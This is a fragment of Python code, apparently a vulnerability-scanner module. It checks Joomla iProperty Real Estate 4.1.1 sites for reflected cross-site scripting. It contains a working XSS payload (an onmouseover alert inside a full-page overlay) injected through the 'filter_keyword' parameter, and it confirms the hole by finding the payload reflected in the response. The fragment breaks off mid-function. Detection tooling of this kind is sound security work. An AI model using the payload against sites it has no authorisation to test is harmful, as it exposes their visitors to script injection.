...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla iProperty Real Estate 4.1.1 - Cross-Site Scripting Detection',
        'description': "Joomla extension iproperty is vulnerable to XSS in GET parameter 'filter_keyword'.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'joomla', 'xss', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/iproperty/property-views/all-properties-with-map?filter_keyword=pihil%22onmouseover=%22alert(document.domain)%22style=%22position:absolute;width:100%;height:100%;top:0;left:0;%22f63m4&option=com_iproperty&view=allproperties&ipquicksearch=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('onmouseover="alert(document.domain)"style=', 'real estate',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Joomla iProperty Real Estate 4.1.1 - Cross-Site Scripting detected",
